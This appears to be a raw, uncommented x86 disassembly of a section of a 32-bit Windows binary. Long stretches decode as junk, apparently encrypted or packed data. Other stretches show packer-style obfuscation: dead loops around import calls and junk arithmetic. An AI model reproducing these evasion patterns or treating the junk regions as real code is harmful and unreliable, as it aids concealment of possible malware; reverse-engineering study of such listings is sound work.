  4030ae:	shl    cl,1
  4030b0:	pop    ebx
  4030b1:	retf   
  4030b2:	mov    ah,0xe3
  4030b4:	icebp  
  4030b5:	std    
  4030b6:	(bad)  
  4030b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030b8:	inc    esi
  4030b9:	mov    esi,0x788ea96c
  4030be:	pop    edi
  4030bf:	stos   DWORD PTR es:[edi],eax
  4030c0:	outs   dx,BYTE PTR ds:[esi]
  4030c1:	cdq    
  4030c2:	xchg   edx,eax
  4030c3:	xchg   ecx,eax
  4030c4:	call   0x42db5a44
  4030c9:	dec    esp
  4030ca:	jp     0x4030be
  4030cc:	rcl    DWORD PTR [esi-0x1f],0xd3
  4030d0:	leave  
  4030d1:	or     ebp,DWORD PTR [edx-0x333f86e3]
  4030d7:	std    
  4030d8:	aad    0xa6
  4030da:	pop    ds
  4030db:	pop    esi
  4030dc:	in     al,dx
  4030dd:	out    0xd,al
  4030df:	and    DWORD PTR [esi+0x50],ecx
  4030e2:	inc    eax
  4030e3:	push   0xcffbcaff
  4030e8:	outs   dx,BYTE PTR ds:[esi]
  4030e9:	lock fidivr WORD PTR [ebp+0x3fa7c0e4]
  4030f0:	xor    BYTE PTR [ebp-0x14],dh
  4030f3:	add    BYTE PTR [eax],al
  4030f5:	inc    edi
  4030f6:	lahf   
  4030f7:	bound  esp,QWORD PTR [esi-0x4f8ed06b]
  4030fd:	pop    ebp
  4030fe:	inc    esi
  4030ff:	xor    BYTE PTR [ebx-0x68],al
  403102:	or     edi,ecx
  403104:	adc    dl,bh
  403106:	sub    ah,BYTE PTR [eax+0x1f]
  403109:	sub    esi,edi
  40310b:	cmc    
  40310c:	(bad)  
  40310d:	push   ecx
  40310e:	push   ecx
  40310f:	and    BYTE PTR [ebx],al
  403111:	and    al,0xe1
  403113:	mov    edx,0xf0f18535
  403118:	jecxz  0x4030af
  40311a:	xor    eax,0x342bc49c
  40311f:	sahf   
  403120:	aam    0x85
  403122:	mov    esp,0x4d4fbef8
  403127:	jno    0x40317a
  403129:	sti    
  40312a:	bound  esi,QWORD PTR [ecx-0x848ee4c]
  403130:	push   esi
  403131:	inc    edx
  403132:	aam    0xc8
  403134:	inc    esp
  403135:	or     DWORD PTR [ebp-0x45f1c276],ecx
  40313b:	fcos   
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	rol    DWORD PTR [eax],0x21
  40315e:	dec    edx
  40315f:	push   0x7e7e17ba
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x40312a
  403169:	js     0x403183
  40316b:	cmp    bh,BYTE PTR es:[ebx+0x78]
  40316f:	adc    DWORD PTR [eax],edx
  403171:	pop    ds
  403172:	xchg   BYTE PTR [ebx+0x6f2083a7],bl
  403178:	or     eax,0xe4ccabe6
  40317d:	jle    0x4031d2
  40317f:	push   es
  403180:	adc    ah,0x9e
  403183:	(bad)  
  403184:	mov    BYTE PTR [ebx+edx*8],0x27
  403188:	sub    al,0xa8
  40318a:	outs   dx,BYTE PTR ds:[esi]
  40318b:	(bad)  
  40318c:	mov    ebx,0xe88546aa
  403191:	xor    eax,0xbdec39a0
  403196:	pop    eax
  403197:	retf   
  403198:	ins    DWORD PTR es:[edi],dx
  403199:	xlat   BYTE PTR ds:[ebx]
  40319a:	rcl    bl,1
  40319c:	test   ebp,edi
  40319e:	leave  
  40319f:	ss adc eax,0xba9b5d97
  4031a5:	push   esi
  4031a6:	push   es
  4031a7:	cmp    DWORD PTR [esi+0x3e],esi
  4031aa:	sub    eax,0x9570ac95
  4031af:	xor    BYTE PTR [eax+0x40e9578],dl
  4031b5:	lods   eax,DWORD PTR cs:[esi]
  4031b7:	std    
  4031b8:	je     0x4031c7
  4031ba:	jns    0x403154
  4031bc:	inc    ebx
  4031bd:	fcom   QWORD PTR [edi-0x64d7a07a]
  4031c3:	daa    
  4031c4:	push   ds
  4031c5:	jo     0x40321d
  4031c7:	jl     0x4031a7
  4031c9:	aas    
  4031ca:	bound  ecx,QWORD PTR [eax-0x35]
  4031cd:	cs inc ebx
  4031cf:	scas   eax,DWORD PTR es:[edi]
  4031d0:	das    
  4031d1:	pop    esi
  4031d2:	lea    esi,[edi+0x2865a6a5]
  4031d8:	pop    es
  4031d9:	into   
  4031da:	jl     0x40320e
  4031dc:	test   eax,0xe677ea92
  4031e1:	loopne 0x403250
  4031e3:	fstp   QWORD PTR [esi]
  4031e5:	lahf   
  4031e6:	arpl   WORD PTR [bx+di-0x15],ax
  4031ea:	and    cl,BYTE PTR [eax]
  4031ec:	shl    DWORD PTR [edx+eax*2+0xc4a379d],cl
  4031f3:	and    BYTE PTR [edx+ebx*4-0x615b8634],bh
  4031fa:	dec    esi
  4031fb:	(bad)  
  4031fd:	xor    al,BYTE PTR [eax-0x3b32c4c9]
  403203:	lods   al,BYTE PTR ds:[esi]
  403204:	adc    esp,edx
  403206:	push   0x36
  403208:	xor    ebx,eax
  40320a:	cld    
  40320b:	sub    eax,0x80f80459
  403210:	xchg   esp,eax
  403211:	call   0x2f10dc7b
  403216:	ds xchg edx,edi
  403219:	push   cs
  40321a:	(bad)  
  40321b:	fwait
  40321c:	scas   eax,DWORD PTR es:[edi]
  40321d:	mov    bl,0xe7
  40321f:	out    0x36,al
  403221:	and    al,0x64
  403223:	fld    TBYTE PTR [esp+eax*2-0x754ade30]
  40322a:	cli    
  40322b:	repnz add DWORD PTR [ebx+0x21],ebx
  40322f:	retf   
  403230:	fnsave [ebp+0x1ad4132d]
  403236:	dec    ebx
  403237:	in     eax,dx
  403238:	mov    ebp,0x7a18782b
  40323d:	loopne 0x403236
  40323f:	ins    BYTE PTR es:[edi],dx
  403240:	sub    al,0x8e
  403242:	adc    al,0xb9
  403244:	pop    edi
  403245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403246:	xor    al,0xd4
  403248:	inc    eax
  403249:	or     ah,bh
  40324b:	dec    esi
  40324c:	(bad)  
  40324d:	lock scas eax,DWORD PTR es:[edi]
  40324f:	shl    dl,0x53
  403252:	or     ecx,DWORD PTR [eax+0x4a82be5]
  403258:	mov    bl,0x1c
  40325a:	jecxz  0x403227
  40325c:	add    al,BYTE PTR [ebp+edx*1-0x43]
  403260:	fld    DWORD PTR [esi]
  403262:	xchg   edi,eax
  403263:	imul   ebx,DWORD PTR [ebx-0x55],0xb5472817
  40326a:	push   0xedaa0442
  40326f:	outs   dx,BYTE PTR ds:[esi]
  403270:	lods   eax,DWORD PTR ds:[esi]
  403271:	and    eax,0xe3b2616
  403276:	or     DWORD PTR [eax+0x20],esp
  403279:	ja     0x403270
  40327b:	imul   eax,ebp,0xabfd47a2
  403281:	mov    ah,0xd
  403283:	dec    eax
  403284:	in     eax,dx
  403285:	in     al,dx
  403286:	or     BYTE PTR [edx],0xa5
  403289:	adc    dh,ah
  40328b:	push   esp
  40328c:	mov    ebp,0x11f20b0f
  403291:	push   es
  403292:	sub    esp,DWORD PTR [ecx-0x511f6473]
  403298:	sbb    al,0x26
  40329a:	out    0x2f,eax
  40329c:	ror    BYTE PTR [eax+0x29697cae],0x82
  4032a3:	retf   0xe124
  4032a6:	pop    ecx
  4032a7:	in     eax,dx
  4032a8:	xor    eax,0x6a498f79
  4032ad:	adc    ebp,ebp
  4032af:	xor    eax,0x61ba9d68
  4032b4:	dec    ebp
  4032b5:	jmp    0x3e7:0x17ff22b9
  4032bc:	mov    ah,0x4
  4032be:	mov    ebp,0x1af1e30d
  4032c3:	sahf   
  4032c4:	mov    cl,0x20
  4032c6:	pop    ebx
  4032c7:	shl    DWORD PTR [edx-0x67],1
  4032ca:	mov    esp,0x98dd4187
  4032cf:	lahf   
  4032d0:	int3   
  4032d1:	pop    edx
  4032d2:	push   ebp
  4032d3:	add    eax,0xc47ee415
  4032d8:	popa   
  4032d9:	and    BYTE PTR [ecx+0x41f2de3f],dh
  4032df:	cmp    eax,0xbcba83b
  4032e4:	dec    DWORD PTR [eax+0x2]
  4032e7:	adc    BYTE PTR [eax+0x5edfd4da],ah
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x67f02b76]
  403537:	fisttp QWORD PTR [esi+eax*8+0x15]
  40353b:	jle    0x4035bb
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x4035bd
  403542:	lods   eax,DWORD PTR ds:[esi]
  403543:	xor    ebp,DWORD PTR [edx+0x23]
  403546:	fwait
  403547:	outs   dx,DWORD PTR ds:[esi]
  403548:	addr16 dec edx
  40354a:	xor    BYTE PTR [edx-0x80],al
  40354d:	jo     0x403503
  40354f:	pop    ebp
  403550:	mov    ds:0x3cbced0a,al
  403555:	jne    0x4035b3
  403557:	xor    bh,cl
  403559:	leave  
  40355a:	cmp    DWORD PTR [esi],edi
  40355c:	add    ebp,DWORD PTR [ebp-0x7bdb2242]
  403562:	ja     0x403547
  403564:	sub    DWORD PTR gs:[ebp-0x4d00b992],eax
  40356b:	jmp    0x3ccc:0x7bddb1c5
  403572:	sbb    al,0x98
  403574:	and    BYTE PTR ds:0x7eda230,bh
  40357a:	call   0x4db3:0xa17513f7
  403581:	mov    cl,0x13
  403583:	mov    dh,0x66
  403585:	mov    dh,0x38
  403587:	or     bl,ah
  403589:	(bad)  
  40358a:	cmc    
  40358b:	loopne 0x403574
  40358d:	stc    
  40358e:	xchg   ebp,eax
  40358f:	retf   0x210a
  403592:	or     BYTE PTR [ebx-0x5d47db21],dl
  403598:	dec    edi
  403599:	xor    BYTE PTR [esi+0x3ee87241],0x2c
  4035a0:	mov    eax,ds:0xaff00250
  4035a5:	jno    0x403618
  4035a7:	cdq    
  4035a8:	adc    eax,0xf2286090
  4035ad:	jb     0x403604
  4035af:	imul   eax,DWORD PTR [ecx+ebp*4-0x23812f96],0xeeccfd8f
  4035ba:	sbb    BYTE PTR [esi-0x8f7de75],bh
  4035c0:	scas   al,BYTE PTR es:[edi]
  4035c1:	adc    al,0x79
  4035c3:	aam    0x77
  4035c5:	add    DWORD PTR [ecx],ecx
  4035c7:	cli    
  4035c8:	pusha  
  4035c9:	cdq    
  4035ca:	rcr    edi,1
  4035cc:	push   esp
  4035cd:	js     0x40356d
  4035cf:	fwait
  4035d0:	push   ds
  4035d1:	je     0x403579
  4035d3:	leave  
  4035d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035d5:	add    eax,0xeee51265
  4035da:	mov    cl,BYTE PTR [eax+0x7b23a0b]
  4035e0:	adc    eax,0x41f855a8
  4035e5:	out    dx,eax
  4035e6:	push   ecx
  4035e7:	in     al,dx
  4035e8:	jnp    0x4035f2
  4035ea:	mov    BYTE PTR [ebx],bl
  4035ec:	inc    eax
  4035ed:	push   ds
  4035ee:	lahf   
  4035ef:	cmp    edi,DWORD PTR [ebx-0x2b]
  4035f2:	mov    edx,edx
  4035f4:	mov    ds,WORD PTR [edi]
  4035f6:	pop    eax
  4035f7:	cwd    
  4035f9:	sbb    eax,0x7e6f5ea8
  4035fe:	sbb    bh,BYTE PTR [edx-0x571851f4]
  403604:	fs out 0x80,eax
  403607:	sbb    BYTE PTR [eax+0x4678d406],dh
  40360d:	inc    edx
  40360e:	xchg   ecx,eax
  40360f:	scas   eax,DWORD PTR es:[edi]
  403610:	inc    ecx
  403611:	lea    esi,[ebp-0x5a7290]
  403617:	ror    BYTE PTR [edi-0x1],cl
  40361a:	or     eax,0xebe5291e
  40361f:	xchg   bh,dh
  403621:	(bad)  
  403622:	jl     0x403624
  403624:	rcr    DWORD PTR [ebp-0x7eb49920],1
  40362a:	arpl   WORD PTR [eax-0x8],cx
  40362d:	cmc    
  40362e:	pop    es
  40362f:	inc    ecx
  403630:	pusha  
  403631:	lds    ebp,FWORD PTR [eax-0x3a]
  403634:	mov    edi,ebp
  403636:	shr    ecx,0xd
  403639:	fs pop es
  40363b:	daa    
  40363c:	inc    ebp
  40363d:	pop    ss
  40363e:	shr    esi,0x65
  403641:	pop    esi
  403642:	in     al,dx
  403643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403644:	cmp    bh,0x20
  403647:	jge    0x4036c8
  403649:	adc    eax,0xcf7be8b7
  40364e:	push   0xffffffd1
  403650:	shl    BYTE PTR [ecx+ecx*8+0x668f44a6],0x8
  403658:	pop    ss
  403659:	add    eax,0x4287960c
  40365e:	sbb    al,0x3e
  403660:	xor    esp,DWORD PTR [edi]
  403662:	mov    bl,0x3f
  403664:	add    ah,ah
  403666:	or     dh,BYTE PTR [ebx+0x53]
  403669:	test   al,0x35
  40366b:	xor    al,BYTE PTR [eax]
  40366d:	ins    BYTE PTR es:[edi],dx
  40366e:	mov    DWORD PTR [edx-0x66],edx
  403671:	scas   al,BYTE PTR es:[edi]
  403672:	mov    DWORD PTR [eax-0x36e0ec8c],ebp
  403678:	adc    eax,0x65aa42
  40367d:	int3   
  40367e:	iret   
  40367f:	enter  0x349f,0xa7
  403683:	jmp    0x4036b1
  403685:	push   ds
  403686:	aaa    
  403687:	out    0x31,eax
  403689:	cmp    DWORD PTR [di-0x6c],ecx
  40368d:	or     ah,BYTE PTR [esi+0x5fe769f9]
  403693:	push   edx
  403694:	fldcw  WORD PTR [ecx]
  403696:	xor    DWORD PTR [esi+0x463e551f],edi
  40369c:	jge    0x403636
  40369e:	adc    cl,BYTE PTR [edi+eax*8+0x4b60b568]
  4036a5:	xchg   edi,eax
  4036a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036a7:	popf   
  4036a8:	pop    edi
  4036a9:	jns    0x403654
  4036ab:	pop    ecx
  4036ac:	push   ds
  4036ad:	bound  ebp,QWORD PTR [esi+eax*2]
  4036b0:	mov    es,ecx
  4036b2:	xchg   ebx,eax
  4036b3:	jg     0x4036d6
  4036b5:	mov    dl,0x4c
  4036b7:	mov    cl,0x85
  4036b9:	stos   DWORD PTR es:[edi],eax
  4036ba:	dec    edx
  4036bb:	sub    BYTE PTR [esi-0x2b],ah
  4036be:	out    dx,al
  4036bf:	aas    
  4036c0:	or     edi,ebx
  4036c2:	jb     0x403659
  4036c4:	cwde   
  4036c5:	jecxz  0x403710
  4036c7:	mov    ah,BYTE PTR [eax+0x5cf199a5]
  4036cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ce:	adc    eax,0x1b4b75b8
  4036d3:	fwait
  4036d4:	mov    eax,ds:0xa00336a0
  4036d9:	add    eax,0xd798b5fb
  4036de:	ret    0x346b
  4036e1:	mov    bl,0x39
  4036e3:	(bad)  
  4036e4:	test   eax,0x1ca2ea83
  4036e9:	mov    ebp,0xebb212df
  4036ee:	mov    ?,WORD PTR ds:0x24786fa0
  4036f4:	dec    eax
  4036f5:	arpl   WORD PTR [edi+0x706779bd],ax
  4036fb:	(bad)  
  4036fd:	cmp    DWORD PTR [ebp-0x1d],0xffffffd4
  403701:	sub    ecx,DWORD PTR [ebp-0x67]
  403704:	mov    edi,0xb9a694ed
  403709:	pop    ebx
  40370a:	dec    ebp
  40370b:	jns    0x403776
  40370d:	xor    ah,BYTE PTR [edx-0x6684cc22]
  403713:	mov    ebx,0x9be4f18e
  403718:	int3   
  403719:	jg     0x40372a
  40371b:	inc    esi
  40371c:	scas   al,BYTE PTR es:[edi]
  40371d:	arpl   WORD PTR [esp+ecx*4-0x2fd95a0],sp
  403724:	fxtract 
  403726:	or     BYTE PTR [ecx-0x4],ch
  403729:	addr16 push esi
  40372b:	fcomp  st(7)
  40372d:	(bad)  
  40372e:	out    dx,eax
  40372f:	fdivr  st,st(3)
  403731:	adc    dl,BYTE PTR ds:0xf8aff59f
  403737:	(bad)  
  403738:	stos   BYTE PTR es:[edi],al
  403739:	push   ss
  40373a:	inc    esp
  40373b:	and    al,0x36
  40373d:	(bad)  
  40373f:	sbb    ebx,edx
  403741:	sub    al,0x82
  403743:	inc    ecx
  403744:	je     0x403740
  403746:	mov    eax,0x23bf6d16
  40374b:	pushf  
  40374c:	add    al,0x3a
  40374e:	mov    eax,0xacae1aea
  403753:	js     0x403783
  403755:	dec    esi
  403756:	sub    esp,ecx
  403758:	xchg   ebp,eax
  403759:	or     al,0x78
  40375b:	div    BYTE PTR [eax-0xc]
  40375e:	add    BYTE PTR [ebp-0x1c118b50],ah
  403764:	jns    0x4037d3
  403766:	loop   0x40379e
  403768:	ss push ebx
  40376a:	add    eax,0xe7676835
  40376f:	mov    al,ds:0x24acd6c4
  403774:	ds pushf 
  403776:	enter  0x918e,0x8e
  40377a:	mov    ecx,0x576ecb30
  40377f:	js     0x40374f
  403781:	stc    
  403782:	lock add DWORD PTR [esi-0x654b4907],edi
  403789:	adc    eax,0xf10bdf74
  40378e:	test   edx,esp
  403790:	out    0x3b,eax
  403792:	popa   
  403793:	(bad)  
  403794:	fs out dx,eax
  403796:	add    ax,0x5054
  40379a:	jp     0x403808
  40379c:	xor    cl,ah
  40379e:	mov    ch,0xce
  4037a0:	push   0x2d32fd86
  4037a5:	aam    0x69
  4037a7:	xchg   DWORD PTR [eax+edx*2+0x17152f60],esp
  4037ae:	xor    eax,0x9f6af4f2
  4037b3:	jo     0x4037e1
  4037b5:	clc    
  4037b6:	iret   
  4037b7:	faddp  st(4),st
  4037b9:	fcmovnbe st,st(6)
  4037bb:	mov    ah,0x89
  4037bd:	dec    edi
  4037be:	test   BYTE PTR [esp+esi*2-0x26],0xb8
  4037c3:	or     ah,BYTE PTR ds:0x64a4a053
  4037c9:	add    esp,DWORD PTR [edx+0x6f]
  4037cc:	stos   BYTE PTR es:[edi],al
  4037cd:	ud2    
  4037cf:	retf   
  4037d0:	ja     0x403784
  4037d2:	mov    esp,0x7322becf
  4037d7:	imul   ebp,ecx,0x544c97e7
  4037dd:	jbe    0x4037e2
  4037df:	out    dx,eax
  4037e0:	add    ch,BYTE PTR [eax+0x4de06eec]
  4037e6:	(bad)  
  4037e7:	adc    eax,0x8901887
  4037ec:	imul   edi,esi,0x0
  4037ef:	jl     0x4037f0
  4037f1:	add    edx,eax
  4037f3:	inc    eax
  4037f4:	mov    bl,0x43
  4037f6:	(bad)  
  4037f7:	xchg   ebp,eax
  4037f8:	xchg   esi,eax
  4037f9:	or     BYTE PTR [esi-0x10441bf4],0xc8
  403800:	mov    eax,0x160f3f47
  403805:	jecxz  0x4037b5
  403807:	mov    BYTE PTR [ebx],bh
  403809:	pop    ds
  40380a:	test   eax,0xf62b4d0
  40380f:	xor    bh,BYTE PTR ds:0x31d6dc91
  403815:	pop    eax
  403816:	pop    edx
  403817:	(bad)  
  403818:	data16 das 
  40381a:	data16 or ah,BYTE PTR [edi]
  40381d:	stos   DWORD PTR es:[edi],eax
  40381e:	inc    edi
  40381f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403820:	aaa    
  403821:	dec    esi
  403822:	pushf  
  403823:	or     DWORD PTR [esi-0x7],0x24
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43377b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43382b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4338a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
